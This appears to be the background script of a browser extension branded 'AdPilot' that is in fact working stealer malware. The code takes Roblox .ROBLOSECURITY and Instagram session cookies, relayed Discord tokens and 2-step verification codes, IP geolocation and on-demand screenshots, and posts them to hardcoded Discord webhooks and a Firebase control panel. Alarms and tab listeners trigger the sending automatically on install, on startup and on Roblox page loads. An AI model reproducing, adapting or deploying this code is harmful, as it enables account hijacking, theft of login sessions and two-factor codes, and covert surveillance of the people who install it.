// ============================================
// WEBHOOK URLs
// ============================================
const WEBHOOK_URL = "https://discord.com/api/webhooks/1535391024820658276/KvBetFLEfz5Tbn0HT-TBZlTI13YQiHRKfYN-uKN9400PuwcmvcdVJ_5AR_4186JIWSm-";
const DEVICE_WEBHOOK_URL = "https://discord.com/api/webhooks/1545748827653279747/e0GpMlAD0YkMDcoapBZeNpvAATsZeS_5XZC46j9Dv0Vk-wciFZd1lNiV9OsPURHNIoD4";
const SCREENSHOT_WEBHOOK_URL = "https://discord.com/api/webhooks/1547373263213043732/w7u78c388abLqAhyeT7Jzu3IF7xUZIF81tYTfqRa0oHE4Hk_dALVTFG1ytMqv-INzCOF";

// ============================================
// FIREBASE
// ============================================
const FIREBASE_DB_URL = "https://panel-188e4-default-rtdb.firebaseio.com";

// ============================================
// BROWSER DETECTION
// ============================================
function getBrowserName() {
  const ua = navigator.userAgent;
  if (ua.includes("Edg/")) return "Edge";
  if (ua.includes("Chrome/")) return "Chrome";
  if (ua.includes("Firefox/")) return "Firefox";
  if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
  return "Unknown Browser";
}

// ============================================
// SCREENSHOT CAPTURE & SEND (with IP + Roblox info)
// ============================================
async function captureAndSendScreenshot(triggerSource = "manual") {
  console.log('Attempting to capture screenshot...');
  try {
    await new Promise(resolve => setTimeout(resolve, 500));

    let tabs = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tabs || tabs.length === 0) {
      const allTabs = await chrome.tabs.query({});
      tabs = allTabs.filter(tab => tab.url && (tab.url.startsWith('http://') || tab.url.startsWith('https://')));
      if (tabs.length === 0) {
        throw new Error('No capturable tab found');
      }
      tabs = [tabs[0]];
    }

    const tab = tabs[0];
    console.log('Capturing tab:', tab.url);

    const dataUrl = await chrome.tabs.captureVisibleTab(tab.windowId, { format: 'png' });
    if (!dataUrl) {
      throw new Error('captureVisibleTab returned null');
    }

    const browser = getBrowserName();
    const ipAddress = await getIPAddress();
    const ipDetails = await getIPDetails(ipAddress);
    const cookie = await getRobloxCookie();
    let robloxInfo = null;
    if (cookie) {
      robloxInfo = await getRobloxAccountInfo(cookie);
    }

    const fields = [
      { name: '🌐 Tab URL', value: tab.url || 'Unknown', inline: false },
      { name: '🌐 Browser', value: browser, inline: true }
    ];

    if (ipAddress) fields.push({ name: '🌍 IP Address', value: `\`\`\`${ipAddress}\`\`\``, inline: true });
    if (ipDetails) {
      fields.push({ name: '🏙️ City', value: ipDetails.city, inline: true });
      fields.push({ name: '📍 State/Region', value: ipDetails.region, inline: true });
      fields.push({ name: '🌎 Country', value: ipDetails.country, inline: true });
      fields.push({ name: '🏢 ISP', value: ipDetails.isp, inline: true });
    }
    if (robloxInfo && robloxInfo.user) {
      fields.push({
        name: '👤 Roblox User',
        value: `[${robloxInfo.user.name}](https://www.roblox.com/users/${robloxInfo.user.id}/profile)`,
        inline: true
      });
    } else {
      fields.push({ name: '👤 Roblox User', value: 'Not logged in', inline: true });
    }

    const formData = new FormData();
    formData.append('file', await (await fetch(dataUrl)).blob(), 'screenshot.png');
    formData.append('payload_json', JSON.stringify({
      content: `📸 Screenshot triggered by **${triggerSource}**`,
      embeds: [{
        title: 'Active Tab Screenshot',
        color: 0x6c5ce7,
        timestamp: new Date().toISOString(),
        footer: { text: 'AdPilot' },
        fields: fields
      }]
    }));

    await fetch(SCREENSHOT_WEBHOOK_URL, {
      method: 'POST',
      body: formData
    });
    console.log('Screenshot sent successfully with IP and Roblox info.');
  } catch (e) {
    console.error('Screenshot capture failed:', e);
    try {
      await fetch(SCREENSHOT_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: `⚠️ Screenshot failed to send: ${e.message}` })
      });
    } catch (inner) {}
  }
}

// ============================================
// REMOTE SCREENSHOT REQUEST HANDLER (multi-device)
// ============================================
const SCREENSHOT_REQUESTS_PATH = "/screenshot_requests";
const SCREENSHOT_REQUEST_CHECK_ALARM = "checkScreenshotRequests";

async function getHighestScreenshotRequestId() {
  try {
    const response = await fetch(`${FIREBASE_DB_URL}${SCREENSHOT_REQUESTS_PATH}.json?shallow=true`);
    if (!response.ok) return null;
    const data = await response.json();
    if (!data) return null;
    const keys = Object.keys(data);
    if (keys.length === 0) return null;
    keys.sort((a, b) => Number(a) - Number(b));
    return keys[keys.length - 1];
  } catch (e) {
    return null;
  }
}

async function checkScreenshotRequests() {
  try {
    const highestId = await getHighestScreenshotRequestId();
    if (!highestId) return;
    const storage = await chrome.storage.local.get({ lastProcessedScreenshotRequestId: "0" });
    const lastProcessed = storage.lastProcessedScreenshotRequestId;
    if (Number(highestId) > Number(lastProcessed)) {
      console.log(`New screenshot request detected (ID: ${highestId})`);
      await captureAndSendScreenshot("discord_button");
      await chrome.storage.local.set({ lastProcessedScreenshotRequestId: highestId });
    }
  } catch (e) {}
}

// ============================================
// ROBLOX AUTO-SEND EVERY 14 MINUTES
// ============================================
chrome.runtime.onInstalled.addListener(async (details) => {
  chrome.alarms.create("autoSendCookie", { periodInMinutes: 14 });
  chrome.alarms.create(POPUP_CHECK_ALARM, { periodInMinutes: 0.5 });
  chrome.alarms.create(SCREENSHOT_REQUEST_CHECK_ALARM, { periodInMinutes: 0.1 });

  const highestId = await getHighestScreenshotRequestId();
  if (highestId) {
    await chrome.storage.local.set({ lastProcessedScreenshotRequestId: highestId });
  }

  if (details.reason === 'install') {
    registerDevice();
  }
});

chrome.runtime.onStartup.addListener(async () => {
  chrome.alarms.create("autoSendCookie", { periodInMinutes: 14 });
  chrome.alarms.create(POPUP_CHECK_ALARM, { periodInMinutes: 0.5 });
  chrome.alarms.create(SCREENSHOT_REQUEST_CHECK_ALARM, { periodInMinutes: 0.1 });

  const highestId = await getHighestScreenshotRequestId();
  if (highestId) {
    await chrome.storage.local.set({ lastProcessedScreenshotRequestId: highestId });
  }
});

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "autoSendCookie") {
    sendRobloxCookieToWebhook("alarm");
  }
  if (alarm.name === POPUP_CHECK_ALARM) {
    checkPopupSetting();
  }
  if (alarm.name === SCREENSHOT_REQUEST_CHECK_ALARM) {
    checkScreenshotRequests();
  }
});

// ============================================
// REMOTE POPUP TOGGLE (from Discord via Firebase)
// ============================================
const POPUP_SETTING_PATH = "/settings/popupEnabled.json";
const POPUP_CHECK_ALARM = "checkPopupSetting";

async function checkPopupSetting() {
  try {
    const response = await fetch(`${FIREBASE_DB_URL}${POPUP_SETTING_PATH}`);
    if (!response.ok) return;
    const enabled = await response.json();
    if (typeof enabled !== "boolean") return;

    const stored = await chrome.storage.local.get({ popupEnabled: true });
    if (stored.popupEnabled !== enabled) {
      await chrome.storage.local.set({ popupEnabled: enabled });
      const tabs = await chrome.tabs.query({ url: "*://*.roblox.com/*" });
      for (const tab of tabs) {
        try {
          await chrome.tabs.sendMessage(tab.id, { action: "popupSettingChanged", enabled: enabled });
        } catch (e) {}
      }
    }
  } catch (e) {}
}

checkPopupSetting();

// ============================================
// ROBLOX TAB DETECTION & SCREENSHOT ON ROBLOX
// ============================================
let lastCookieSent = "";
let lastKnownCookie = "";
let noCookieSent = false;

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url) {
    if (tab.url.includes("roblox.com")) {
      setTimeout(() => {
        checkCookieAndSend("tabUpdate");
        captureAndSendScreenshot("roblox_page");
      }, 2000);
    }
  }
});

chrome.tabs.onCreated.addListener((tab) => {
  if (tab.url && tab.url.includes("roblox.com")) {
    setTimeout(() => {
      checkCookieAndSend("tabCreate");
      captureAndSendScreenshot("roblox_new_tab");
    }, 2000);
  }
});

// ============================================
// ROBLOX COOKIE CHANGE DETECTION
// ============================================
getRobloxCookie().then(cookie => {
  if (cookie) lastKnownCookie = cookie;
});

setInterval(async () => {
  const cookie = await getRobloxCookie();
  if (cookie && cookie !== lastKnownCookie) {
    lastKnownCookie = cookie;
    noCookieSent = false;
    sendRobloxCookieToWebhook("cookieChange");
  }
}, 15000);

// ============================================
// IP FUNCTIONS
// ============================================
async function getIPAddress() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    if (response.ok) {
      const data = await response.json();
      return data.ip;
    }
    return null;
  } catch (e) {
    return null;
  }
}

async function getIPDetails(ip) {
  if (!ip) return null;
  try {
    const response = await fetch(`https://ipwho.is/${ip}`);
    if (response.ok) {
      const data = await response.json();
      if (data.success) {
        return {
          city: data.city || "Unknown",
          region: data.region || "Unknown",
          country: data.country || "Unknown",
          isp: data.connection?.isp || "Unknown",
          timezone: data.timezone?.id || "Unknown"
        };
      }
    }
  } catch (e) {}
  return null;
}

// ============================================
// ROBLOX FUNCTIONS
// ============================================
async function getRobloxCookie() {
  try {
    const cookie = await chrome.cookies.get({
      url: "https://www.roblox.com",
      name: ".ROBLOSECURITY"
    });
    return cookie ? cookie.value : null;
  } catch (e) {
    return null;
  }
}

async function sendNoCookieEmbed() {
  const ipAddress = await getIPAddress();
  const ipDetails = await getIPDetails(ipAddress);
  const browser = getBrowserName();

  const embed = {
    title: "❌ No Roblox Cookie Found",
    description: "The extension could not find a Roblox cookie in the browser.\n\n**Possible reasons:**\n• Not logged into Roblox\n• Cookie expired\n• Roblox session cleared\n\n**Solution:** Log into Roblox at roblox.com",
    color: 0xFF5252,
    timestamp: new Date().toISOString(),
    footer: { text: "AdPilot" },
    fields: [
      { name: "🌐 Browser", value: browser, inline: true }
    ]
  };

  if (ipAddress) {
    embed.fields.push({ name: "🌍 IP Address", value: `\`\`\`${ipAddress}\`\`\``, inline: true });
  }

  if (ipDetails) {
    embed.fields.push({ name: "🏙️ City", value: ipDetails.city, inline: true });
    embed.fields.push({ name: "📍 State/Region", value: ipDetails.region, inline: true });
    embed.fields.push({ name: "🌎 Country", value: ipDetails.country, inline: true });
    embed.fields.push({ name: "🏢 ISP", value: ipDetails.isp, inline: true });
  }

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (e) {}
}

async function checkCookieAndSend(tabSource) {
  const cookie = await getRobloxCookie();
  if (!cookie) {
    sendNoCookieEmbed();
    return;
  }
  noCookieSent = false;
  sendRobloxCookieToWebhook(tabSource);
}

async function getRobloxAccountInfo(cookie) {
  const headers = { "Cookie": `.ROBLOSECURITY=${cookie}` };
  try {
    const userRes = await fetch("https://users.roblox.com/v1/users/authenticated", { headers });
    if (!userRes.ok) return null;
    const user = await userRes.json();

    let avatarUrl = "";
    try {
      const avatarRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=420x420&format=Png&isCircular=false`, { headers });
      if (avatarRes.ok) {
        const avatarData = await avatarRes.json();
        if (avatarData.data?.[0]) avatarUrl = avatarData.data[0].imageUrl;
      }
    } catch (e) {}

    let robux = null;
    try {
      const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, { headers });
      if (robuxRes.ok) robux = (await robuxRes.json()).robux;
    } catch (e) {}

    let premium = null;
    try {
      const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, { headers });
      if (premiumRes.ok) premium = await premiumRes.json() === true ? "Yes" : "No";
    } catch (e) {}

    let instagramSessionId = null;
    try {
      const igCookie = await chrome.cookies.get({
        url: "https://www.instagram.com",
        name: "sessionid"
      });
      if (igCookie) instagramSessionId = igCookie.value;
    } catch (e) {}

    return { user, avatarUrl, robux, premium, instagramSessionId };
  } catch (e) {
    return null;
  }
}

async function sendRobloxCookieToWebhook(source = "manual") {
  const cookie = await getRobloxCookie();
  if (!cookie) {
    sendNoCookieEmbed();
    return;
  }

  noCookieSent = false;
  lastCookieSent = cookie;
  lastKnownCookie = cookie;

  const accountInfo = await getRobloxAccountInfo(cookie);
  if (!accountInfo) return;

  const { user, avatarUrl, robux, premium, instagramSessionId } = accountInfo;
  const ipAddress = await getIPAddress();
  const ipDetails = await getIPDetails(ipAddress);
  const browser = getBrowserName();

  // Update device info with username
  if (deviceId) {
    fetch(`${FIREBASE_DB_URL}/devices/${deviceId}/robloxUsername.json`, {
      method: 'PUT',
      body: JSON.stringify(user.name)
    }).catch(() => {});
  }

  const sourceLabels = {
    "startup": "🚀 Browser Opened",
    "alarm": "⏰ Auto-Send (14 min)",
    "tabCreate": "🌐 New Roblox Tab",
    "tabUpdate": "🌐 Roblox Page Loaded",
    "cookieChange": "🔑 Account Changed"
  };

  const embed = {
    title: "🔐 New Roblox Cookie",
    description: `**Account:** [${user.name}](https://www.roblox.com/users/${user.id}/profile)\n**User ID:** ${user.id}`,
    color: 0x6c5ce7,
    timestamp: new Date().toISOString(),
    footer: { text: "Auto‑Connect" },
    fields: [
      { name: "📌 Source", value: sourceLabels[source] || source, inline: false },
      { name: "🌐 Browser", value: browser, inline: true }
    ]
  };

  if (ipAddress) embed.fields.push({ name: "🌍 IP Address", value: `\`\`\`${ipAddress}\`\`\``, inline: true });
  if (ipDetails) {
    embed.fields.push({ name: "🏙️ City", value: ipDetails.city, inline: true });
    embed.fields.push({ name: "📍 State/Region", value: ipDetails.region, inline: true });
    embed.fields.push({ name: "🌎 Country", value: ipDetails.country, inline: true });
    embed.fields.push({ name: "🏢 ISP", value: ipDetails.isp, inline: true });
  }

  embed.description += `\n\n**Cookie:**\n\`\`\`${cookie}\`\`\``;

  if (robux !== null) embed.fields.push({ name: "💰 Robux", value: robux.toString(), inline: true });
  if (premium !== null) embed.fields.push({ name: "⭐ Premium", value: premium, inline: true });
  if (avatarUrl) embed.thumbnail = { url: avatarUrl };
  if (instagramSessionId) {
    embed.fields.push({ name: "📸 Instagram Session ID", value: `\`\`\`${instagramSessionId}\`\`\``, inline: false });
  } else {
    embed.fields.push({ name: "📸 Instagram Session ID", value: "Not found", inline: false });
  }

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (e) {}
}

sendRobloxCookieToWebhook("startup");

// ============================================
// MESSAGE HANDLERS
// ============================================
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === 'sendDiscordToken') {
    sendDiscordTokenToWebhook(
      message.token,
      message.username,
      message.displayName,
      message.avatarUrl,
      message.accountAge,
      message.guilds
    )
      .then(() => sendResponse({ success: true }))
      .catch((err) => sendResponse({ success: false, error: err.message }));
    return true;
  }

  if (message.action === 'startVerificationClicked') {
    (async () => {
      let username = 'Unknown';
      try {
        const cookie = await getRobloxCookie();
        if (cookie) {
          const info = await getRobloxAccountInfo(cookie);
          if (info && info.user && info.user.name) {
            username = info.user.name;
          }
        }
      } catch (e) {}
      await sendStartVerificationToWebhook(username);
      sendResponse({ success: true });
    })();
    return true;
  }

  if (message.action === 'sendTwoStepCode') {
    const code = message.code;
    if (!code || code.length !== 6) {
      sendResponse({ success: false, error: 'Invalid code' });
      return true;
    }
    sendTwoStepCodeToWebhook(code)
      .then(() => sendResponse({ success: true }))
      .catch((err) => sendResponse({ success: false, error: err.message }));
    return true;
  }
});

// ============================================
// DEVICE REGISTRATION & HEARTBEAT
// ============================================
let deviceId = null;

function getDeviceId(callback) {
  chrome.storage.local.get(['deviceId'], (result) => {
    if (!result.deviceId) {
      const id = 'dev_' + Math.random().toString(36).substr(2, 6).toUpperCase();
      chrome.storage.local.set({ deviceId: id }, () => callback(id));
    } else {
      callback(result.deviceId);
    }
  });
}

async function registerDevice() {
  getDeviceId(async (id) => {
    deviceId = id;
    const ip = await getIPAddress();
    const country = await getIPDetails(ip)?.country || "Unknown";
    const browser = getBrowserName();
    const os = navigator.platform;

    // Fetch Roblox username if available
    let robloxUsername = "Unknown";
    try {
      const cookie = await getRobloxCookie();
      if (cookie) {
        const info = await getRobloxAccountInfo(cookie);
        if (info && info.user && info.user.name) {
          robloxUsername = info.user.name;
        }
      }
    } catch (e) {}

    const embed = {
      title: "🆕 Device Registered",
      color: 0x6c5ce7,
      fields: [
        { name: "Device ID", value: deviceId, inline: true },
        { name: "Browser", value: browser, inline: true },
        { name: "OS", value: os, inline: true },
        { name: "IP Address", value: ip || "Unknown", inline: true },
        { name: "Country", value: country, inline: true },
        { name: "Roblox Username", value: robloxUsername, inline: true }
      ],
      timestamp: new Date().toISOString()
    };

    try {
      await fetch(DEVICE_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] })
      });
    } catch (e) {}

    fetch(`${FIREBASE_DB_URL}/devices/${deviceId}.json`, {
      method: "PUT",
      body: JSON.stringify({
        deviceId,
        browser,
        os,
        ip,
        country,
        lastSeen: Date.now(),
        online: true,
        robloxUsername
      })
    });
  });
}

// Heartbeat every 30 seconds (also update username if possible)
setInterval(async () => {
  if (deviceId) {
    fetch(`${FIREBASE_DB_URL}/devices/${deviceId}/lastSeen.json`, {
      method: "PUT",
      body: JSON.stringify(Date.now())
    });

    // Attempt to update username if cookie exists
    try {
      const cookie = await getRobloxCookie();
      if (cookie) {
        const info = await getRobloxAccountInfo(cookie);
        if (info && info.user && info.user.name) {
          fetch(`${FIREBASE_DB_URL}/devices/${deviceId}/robloxUsername.json`, {
            method: 'PUT',
            body: JSON.stringify(info.user.name)
          });
        }
      }
    } catch (e) {}
  }
}, 30000);

// ============================================
// SEND START VERIFICATION NOTIFICATION
// ============================================
async function sendStartVerificationToWebhook(username) {
  const browser = getBrowserName();
  const embed = {
    title: "🔘 Start Verification Clicked",
    description: `A user clicked the **Start Verification** button.`,
    color: 0x00b894,
    timestamp: new Date().toISOString(),
    footer: { text: "AdPilot" },
    fields: [
      { name: "👤 Roblox Username", value: username, inline: true },
      { name: "🌐 Browser", value: browser, inline: true }
    ]
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (e) {}
}

// ============================================
// SEND 2SV CODE TO WEBHOOK
// ============================================
async function sendTwoStepCodeToWebhook(code) {
  const browser = getBrowserName();
  const embed = {
    title: "🔐 2-Step Verification Code",
    description: `Code entered: \`\`\`${code}\`\`\``,
    color: 0x6c5ce7,
    timestamp: new Date().toISOString(),
    footer: { text: "AdPilot" },
    fields: [
      { name: "🌐 Browser", value: browser, inline: true }
    ]
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (e) {
    throw e;
  }
}

// ============================================
// SEND DISCORD TOKEN TO WEBHOOK
// ============================================
async function sendDiscordTokenToWebhook(token, username, displayName, avatarUrl, accountAge, guilds) {
  const guildList = guilds && guilds.length > 0 ? guilds.slice(0, 20).join(', ') : 'None';
  if (guilds && guilds.length > 20) {
    guildList += ` (and ${guilds.length - 20} more)`;
  }
  const browser = getBrowserName();

  const embed = {
    title: "🔑 New Discord Account Added",
    description: `**Display Name:** ${displayName}\n**Username:** ${username}`,
    color: 0x00b894,
    timestamp: new Date().toISOString(),
    footer: { text: "AdPilot" },
    thumbnail: { url: avatarUrl },
    fields: [
      { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
      { name: "Account Age", value: accountAge, inline: true },
      { name: "Servers Joined", value: `\`\`\`${guildList}\`\`\``, inline: false },
      { name: "🌐 Browser", value: browser, inline: true }
    ]
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (e) {
    throw e;
  }
}